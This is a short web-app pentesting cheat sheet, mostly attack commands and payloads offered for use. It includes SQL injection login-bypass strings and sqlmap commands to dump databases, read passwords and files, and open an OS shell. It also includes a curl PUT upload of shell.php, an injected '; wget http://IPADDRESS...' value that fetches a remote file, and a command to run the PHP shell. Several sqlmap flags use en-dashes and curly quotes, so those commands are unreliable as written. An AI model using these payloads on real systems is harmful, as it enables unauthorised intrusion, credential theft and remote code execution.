# WebApp

## SQLInjections

Common Injections for Login Forms:
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```

## domain-to-webapp
```
./webAppChecker www.example.com ./ouput_dir ./scope.txt
```

## SQLMAP

Automated scan
```
sqlmap -u http://example.com –forms –batch –crawl=10 –cookie=jsessionid=54321 –level=5 –risk=3
```

Targeted scan
```
sqlmap -u http://example.com -p PARAM –data=POSTDATA –cookie=COOKIE –level=3 –current-user –current-db –passwords –file-read=”/var/www/blah.php”
```

Scan url for union AND error based injection with MYSQL backend AND use a random user agent AND database dump
```
sqlmap -u “http://example.com/vuln.php?id=1” –dbms=mysql –tech=U –random-agent –dump
```

Find forms for injections
```
sqlmap -o -u “http://meh.com/form/” –forms
```

Dump + crack hashes for table users on database-name
```
sqlmap -o -u “http://meh/vuln-form” –forms -D database-name -T users –dump
```

Flushes the session
```
sqlmap --flush session
```

Attempts to exploit the “user” field using boolean technique
```
sqlmap -p user --technique=B
```

Capture a request via Burp Suite, save it to a file, and use this command to let sqlmap automate everything. Add –os-shell at the end to pop a shell if possible
```
sqlmap -r <captured request>
```

## Command Injection

File Traverse
```
website.com/file.php[?path=/]
```

Test HTTP options using curl
```
curl -vX OPTIONS [website]
```

Upload file using CURL to website with PUT option available
```
curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0
```

Transfer file
```
?path=/; wget http://IPADDRESS:8000/FILENAME.EXTENTION;
```

Activate shell file
```
; php -f filelocation.php;
```